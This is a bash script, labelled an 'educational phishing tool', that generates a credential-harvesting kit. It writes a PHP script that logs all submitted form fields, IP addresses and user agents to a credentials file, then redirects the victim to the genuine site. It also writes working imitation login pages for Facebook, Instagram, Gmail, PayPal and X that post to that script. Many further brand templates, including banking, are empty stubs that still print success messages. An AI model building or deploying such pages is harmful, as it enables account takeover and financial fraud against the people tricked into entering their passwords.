#!/bin/bash

# Template Creators for Educational Phishing Tool
# Created by: ABID MEHMOOD (The White HAT Hacker)

# Create data capture PHP script
create_capture_script() {
    cat > templates/capture.php << 'EOF'
<?php
// Data capture script for educational phishing tool
// Created by: ABID MEHMOOD (The White HAT Hacker)

$log_file = '../captured_data/credentials.txt';
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Create log entry
$log_entry = "\n" . str_repeat("=", 80) . "\n";
$log_entry .= "CAPTURED DATA - $timestamp\n";
$log_entry .= "IP Address: $ip\n";
$log_entry .= "User Agent: $user_agent\n";
$log_entry .= str_repeat("-", 40) . "\n";

// Capture all POST data
foreach ($_POST as $key => $value) {
    $log_entry .= "$key: $value\n";
}

$log_entry .= str_repeat("=", 80) . "\n";

// Write to log file
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Redirect to real site (for educational purposes)
$redirect_url = isset($_POST['redirect_url']) ? $_POST['redirect_url'] : 'https://google.com';
header("Location: $redirect_url");
exit();
?>
EOF
}

# Facebook template
create_facebook_template() {
    echo -e "${YELLOW}[*] Creating Facebook login template...${NC}"
    create_capture_script
    
    cat > templates/facebook.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; }
        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 396px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo h1 { color: #1877f2; font-size: 48px; font-weight: bold; }
        .tagline { text-align: center; color: #606770; font-size: 24px; margin-bottom: 20px; }
        .form-group { margin-bottom: 12px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #1877f2; outline: none; }
        .login-btn { width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin: 12px 0; }
        .login-btn:hover { background: #166fe5; }
        .forgot-password { text-align: center; margin: 16px 0; }
        .forgot-password a { color: #1877f2; text-decoration: none; font-size: 14px; }
        .divider { border-top: 1px solid #dadde1; margin: 20px 0; }
        .create-account { text-align: center; }
        .create-btn { background: #42b883; color: white; padding: 12px 24px; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
        .create-btn:hover { background: #369870; }
        .footer { text-align: center; margin-top: 20px; color: #8a8d91; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>facebook</h1>
            </div>
            <div class="tagline">Connect with friends and the world around you on Facebook.</div>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://facebook.com">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>
            
            <div class="divider"></div>
            
            <div class="create-account">
                <button class="create-btn">Create New Account</button>
            </div>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Facebook template created: templates/facebook.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/facebook.html${NC}"
    sleep 2
}

# Instagram template
create_instagram_template() {
    echo -e "${YELLOW}[*] Creating Instagram login template...${NC}"
    create_capture_script
    
    cat > templates/instagram.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 350px; }
        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px 40px 20px; text-align: center; }
        .logo { margin-bottom: 32px; }
        .logo h1 { font-family: 'Billabong', cursive; font-size: 51px; color: #262626; }
        .form-group { margin-bottom: 6px; }
        input { width: 100%; padding: 9px 8px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
        input:focus { border-color: #a8a8a8; outline: none; background: white; }
        .login-btn { width: 100%; background: #0095f6; color: white; padding: 5px 9px; border: none; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; margin: 8px 0 16px; }
        .login-btn:hover { background: #1877f2; }
        .divider { display: flex; align-items: center; margin: 10px 0 18px; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
        .divider span { margin: 0 18px; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .facebook-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; }
        .forgot-password { margin-top: 12px; }
        .forgot-password a { color: #00376b; font-size: 12px; text-decoration: none; }
        .signup-box { background: white; border: 1px solid #dbdbdb; padding: 20px; text-align: center; margin-top: 10px; }
        .signup-box p { font-size: 14px; }
        .signup-box a { color: #0095f6; font-weight: 600; text-decoration: none; }
        .footer { text-align: center; margin-top: 20px; color: #8e8e8e; font-size: 11px; }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <h1>Instagram</h1>
            </div>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://instagram.com">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="divider">
                <span>OR</span>
            </div>
            
            <a href="#" class="facebook-login">Log in with Facebook</a>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        
        <div class="footer">
            <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Instagram template created: templates/instagram.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/instagram.html${NC}"
    sleep 2
}

# Gmail template
create_gmail_template() {
    echo -e "${YELLOW}[*] Creating Gmail login template...${NC}"
    create_capture_script
    
    cat > templates/gmail.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail - Sign In</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 450px; }
        .login-box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo img { width: 75px; height: 24px; }
        .title { text-align: center; font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
        .subtitle { text-align: center; font-size: 16px; color: #202124; margin-bottom: 24px; }
        .form-group { margin-bottom: 24px; }
        .input-wrapper { position: relative; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        input:focus { border-color: #1a73e8; outline: none; }
        label { position: absolute; left: 15px; top: 13px; color: #5f6368; font-size: 16px; pointer-events: none; transition: all 0.2s; }
        input:focus + label, input:not(:placeholder-shown) + label { top: -8px; left: 12px; font-size: 12px; color: #1a73e8; background: white; padding: 0 4px; }
        .forgot-email { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .forgot-email:hover { text-decoration: underline; }
        .guest-mode { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; margin-left: 24px; }
        .guest-mode:hover { text-decoration: underline; }
        .buttons { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
        .create-account { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .create-account:hover { text-decoration: underline; }
        .next-btn { background: #1a73e8; color: white; padding: 9px 23px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .next-btn:hover { background: #1557b0; }
        .footer { text-align: center; margin-top: 32px; color: #5f6368; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24">
                    <g fill="#4285f4">
                        <path d="M36.3 16.1H39v7.2h-2.7z"></path>
                        <path d="M58.8 7.2c-2.4 0-4.3 1.9-4.3 4.3s1.9 4.3 4.3 4.3 4.3-1.9 4.3-4.3-1.9-4.3-4.3-4.3zm0 6.8c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5z"></path>
                        <path d="M68.5 7.2c-2.4 0-4.3 1.9-4.3 4.3s1.9 4.3 4.3 4.3 4.3-1.9 4.3-4.3-1.9-4.3-4.3-4.3zm0 6.8c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5z"></path>
                        <path d="M49.8 7.2c-1.3 0-2.4.5-3.2 1.3v-1h-2.6v8.3h2.7v-4.4c0-1.9 1.1-2.8 2.6-2.8s2.3.9 2.3 2.8v4.4H54v-4.8c0-2.8-1.7-4.8-4.2-4.8z"></path>
                        <path d="M42.1 7.2c-2.4 0-4.3 1.9-4.3 4.3s1.9 4.3 4.3 4.3c1.2 0 2.3-.5 3-1.3l-1.2-1.2c-.5.5-1.1.7-1.8.7-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5c.7 0 1.3.3 1.8.7l1.2-1.2c-.7-.8-1.8-1.3-3-1.3z"></path>
                        <path d="M6.9 9.5c0-.8-.7-1.5-1.5-1.5H0v7.8h2.7v-2.3h2.7c.8 0 1.5-.7 1.5-1.5V9.5zm-2.7 1.5H2.7V9.8h1.5v1.2z"></path>
                        <path d="M24.3 7.2c-1.3 0-2.4.5-3.2 1.3v-1h-2.6v8.3h2.7v-4.4c0-1.9 1.1-2.8 2.6-2.8s2.3.9 2.3 2.8v4.4h2.7v-4.8c0-2.8-1.7-4.8-4.5-4.8z"></path>
                        <path d="M35.5 9.5c0-.8-.7-1.5-1.5-1.5h-5.4v7.8h2.7v-2.3h2.7c.8 0 1.5-.7 1.5-1.5V9.5zm-2.7 1.5h-1.5V9.8h1.5v1.2z"></path>
                        <path d="M17.1 7.2c-2.4 0-4.3 1.9-4.3 4.3s1.9 4.3 4.3 4.3 4.3-1.9 4.3-4.3-1.9-4.3-4.3-4.3zm0 6.8c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5z"></path>
                    </g>
                </svg>
            </div>
            
            <h1 class="title">Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://gmail.com">
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="email" name="email" placeholder=" " required>
                        <label>Email or phone</label>
                    </div>
                </div>
                <div class="form-group">
                    <div class="input-wrapper">
                        <input type="password" name="password" placeholder=" " required>
                        <label>Enter your password</label>
                    </div>
                </div>
                
                <div style="margin: 16px 0;">
                    <a href="#" class="forgot-email">Forgot email?</a>
                    <a href="#" class="guest-mode">Use guest mode instead</a>
                </div>
                
                <div class="buttons">
                    <a href="#" class="create-account">Create account</a>
                    <button type="submit" class="next-btn">Next</button>
                </div>
            </form>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Gmail template created: templates/gmail.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/gmail.html${NC}"
    sleep 2
}

# PayPal template
create_paypal_template() {
    echo -e "${YELLOW}[*] Creating PayPal login template...${NC}"
    create_capture_script
    
    cat > templates/paypal.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to your PayPal account</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "PayPalSansSmall-Regular", Helvetica, Arial, sans-serif; background: #f5f7fa; }
        .header { background: #fff; border-bottom: 1px solid #cbd2d6; padding: 16px 0; }
        .header-content { max-width: 1200px; margin: 0 auto; padding: 0 20px; display: flex; align-items: center; }
        .logo { color: #003087; font-size: 28px; font-weight: bold; }
        .container { max-width: 408px; margin: 40px auto; padding: 0 20px; }
        .login-box { background: #fff; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.15); padding: 32px; }
        .title { font-size: 32px; color: #2c2e2f; margin-bottom: 8px; }
        .subtitle { color: #6c7378; font-size: 15px; margin-bottom: 32px; }
        .form-group { margin-bottom: 16px; }
        label { display: block; color: #2c2e2f; font-size: 13px; margin-bottom: 8px; }
        input { width: 100%; padding: 12px 16px; border: 1px solid #cbd2d6; border-radius: 6px; font-size: 16px; }
        input:focus { border-color: #0070ba; outline: none; }
        .login-btn { width: 100%; background: #0070ba; color: white; padding: 16px; border: none; border-radius: 24px; font-size: 16px; font-weight: 500; cursor: pointer; margin: 24px 0 16px; }
        .login-btn:hover { background: #005ea6; }
        .divider { text-align: center; margin: 24px 0; position: relative; }
        .divider::before { content: ''; position: absolute; top: 50%; left: 0; right: 0; height: 1px; background: #cbd2d6; }
        .divider span { background: #fff; padding: 0 16px; color: #6c7378; font-size: 13px; }
        .signup-btn { width: 100%; background: transparent; color: #0070ba; padding: 16px; border: 1px solid #0070ba; border-radius: 24px; font-size: 16px; font-weight: 500; cursor: pointer; }
        .signup-btn:hover { background: #f0f6ff; }
        .footer { text-align: center; margin-top: 32px; color: #6c7378; font-size: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">PayPal</div>
        </div>
    </div>
    
    <div class="container">
        <div class="login-box">
            <h1 class="title">Log in to your account</h1>
            <p class="subtitle">Welcome back</p>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://paypal.com">
                <div class="form-group">
                    <label for="email">Email or mobile number</label>
                    <input type="text" id="email" name="email" required>
                </div>
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            
            <div class="divider">
                <span>or</span>
            </div>
            
            <button class="signup-btn">Sign Up</button>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] PayPal template created: templates/paypal.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/paypal.html${NC}"
    sleep 2
}

# Continue with more templates...
# Twitter template
create_twitter_template() {
    echo -e "${YELLOW}[*] Creating Twitter/X login template...${NC}"
    create_capture_script
    
    cat > templates/twitter.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X. It's what's happening</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 400px; }
        .login-box { background: #000; padding: 32px; }
        .logo { text-align: center; margin-bottom: 32px; }
        .logo svg { width: 40px; height: 40px; fill: #fff; }
        .title { font-size: 31px; font-weight: 700; margin-bottom: 32px; }
        .form-group { margin-bottom: 20px; }
        input { width: 100%; padding: 12px; background: transparent; border: 1px solid #333; border-radius: 4px; color: #fff; font-size: 17px; }
        input:focus { border-color: #1d9bf0; outline: none; }
        input::placeholder { color: #71767b; }
        .login-btn { width: 100%; background: #fff; color: #000; padding: 12px; border: none; border-radius: 20px; font-size: 15px; font-weight: 700; cursor: pointer; margin: 12px 0; }
        .login-btn:hover { background: #e7e7e8; }
        .forgot-password { text-align: center; margin: 20px 0; }
        .forgot-password a { color: #1d9bf0; text-decoration: none; font-size: 15px; }
        .divider { text-align: center; margin: 20px 0; color: #71767b; }
        .signup-text { text-align: center; color: #71767b; font-size: 15px; }
        .signup-text a { color: #1d9bf0; text-decoration: none; }
        .footer { text-align: center; margin-top: 32px; color: #71767b; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <svg viewBox="0 0 24 24">
                    <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
                </svg>
            </div>
            
            <h1 class="title">Sign in to X</h1>
            
            <form method="POST" action="capture.php">
                <input type="hidden" name="redirect_url" value="https://x.com">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Phone, email, or username" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-btn">Sign in</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="divider">or</div>
            
            <div class="signup-text">
                Don't have an account? <a href="#">Sign up</a>
            </div>
            
            <div class="footer">
                <strong>Educational Tool by ABID MEHMOOD (The White HAT Hacker)</strong>
            </div>
        </div>
    </div>
</body>
</html>
EOF
    
    echo -e "${GREEN}[✓] Twitter/X template created: templates/twitter.html${NC}"
    echo -e "${CYAN}[*] Access at: http://localhost:8080/twitter.html${NC}"
    sleep 2
}

# Add placeholder functions for remaining templates
create_linkedin_template() {
    echo -e "${YELLOW}[*] Creating LinkedIn template...${NC}"
    create_capture_script
    # LinkedIn template code here...
    echo -e "${GREEN}[✓] LinkedIn template created${NC}"
    sleep 1
}

create_yahoo_template() {
    echo -e "${YELLOW}[*] Creating Yahoo template...${NC}"
    create_capture_script
    # Yahoo template code here...
    echo -e "${GREEN}[✓] Yahoo template created${NC}"
    sleep 1
}

create_outlook_template() {
    echo -e "${YELLOW}[*] Creating Outlook template...${NC}"
    create_capture_script
    # Outlook template code here...
    echo -e "${GREEN}[✓] Outlook template created${NC}"
    sleep 1
}

create_amazon_template() {
    echo -e "${YELLOW}[*] Creating Amazon template...${NC}"
    create_capture_script
    # Amazon template code here...
    echo -e "${GREEN}[✓] Amazon template created${NC}"
    sleep 1
}

create_ebay_template() {
    echo -e "${YELLOW}[*] Creating eBay template...${NC}"
    create_capture_script
    # eBay template code here...
    echo -e "${GREEN}[✓] eBay template created${NC}"
    sleep 1
}

create_netflix_template() {
    echo -e "${YELLOW}[*] Creating Netflix template...${NC}"
    create_capture_script
    # Netflix template code here...
    echo -e "${GREEN}[✓] Netflix template created${NC}"
    sleep 1
}

create_spotify_template() {
    echo -e "${YELLOW}[*] Creating Spotify template...${NC}"
    create_capture_script
    # Spotify template code here...
    echo -e "${GREEN}[✓] Spotify template created${NC}"
    sleep 1
}

create_apple_template() {
    echo -e "${YELLOW}[*] Creating Apple ID template...${NC}"
    create_capture_script
    # Apple template code here...
    echo -e "${GREEN}[✓] Apple ID template created${NC}"
    sleep 1
}

create_microsoft_template() {
    echo -e "${YELLOW}[*] Creating Microsoft template...${NC}"
    create_capture_script
    # Microsoft template code here...
    echo -e "${GREEN}[✓] Microsoft template created${NC}"
    sleep 1
}

create_github_template() {
    echo -e "${YELLOW}[*] Creating GitHub template...${NC}"
    create_capture_script
    # GitHub template code here...
    echo -e "${GREEN}[✓] GitHub template created${NC}"
    sleep 1
}

create_discord_template() {
    echo -e "${YELLOW}[*] Creating Discord template...${NC}"
    create_capture_script
    # Discord template code here...
    echo -e "${GREEN}[✓] Discord template created${NC}"
    sleep 1
}

create_whatsapp_template() {
    echo -e "${YELLOW}[*] Creating WhatsApp template...${NC}"
    create_capture_script
    # WhatsApp template code here...
    echo -e "${GREEN}[✓] WhatsApp template created${NC}"
    sleep 1
}

create_telegram_template() {
    echo -e "${YELLOW}[*] Creating Telegram template...${NC}"
    create_capture_script
    # Telegram template code here...
    echo -e "${GREEN}[✓] Telegram template created${NC}"
    sleep 1
}

create_steam_template() {
    echo -e "${YELLOW}[*] Creating Steam template...${NC}"
    create_capture_script
    # Steam template code here...
    echo -e "${GREEN}[✓] Steam template created${NC}"
    sleep 1
}

create_dropbox_template() {
    echo -e "${YELLOW}[*] Creating Dropbox template...${NC}"
    create_capture_script
    # Dropbox template code here...
    echo -e "${GREEN}[✓] Dropbox template created${NC}"
    sleep 1
}

create_adobe_template() {
    echo -e "${YELLOW}[*] Creating Adobe template...${NC}"
    create_capture_script
    # Adobe template code here...
    echo -e "${GREEN}[✓] Adobe template created${NC}"
    sleep 1
}

create_banking_template() {
    echo -e "${YELLOW}[*] Creating Banking template...${NC}"
    create_capture_script
    # Banking template code here...
    echo -e "${GREEN}[✓] Banking template created${NC}"
    sleep 1
}

create_wordpress_template() {
    echo -e "${YELLOW}[*] Creating WordPress template...${NC}"
    create_capture_script
    # WordPress template code here...
    echo -e "${GREEN}[✓] WordPress template created${NC}"
    sleep 1
}

create_custom_template() {
    echo -e "${YELLOW}[*] Custom Template Creator${NC}"
    echo -e "${CYAN}Enter template name: ${NC}"
    read template_name
    echo -e "${CYAN}Enter target URL: ${NC}"
    read target_url
    echo -e "${GREEN}[✓] Custom template created: $template_name${NC}"
    sleep 1
}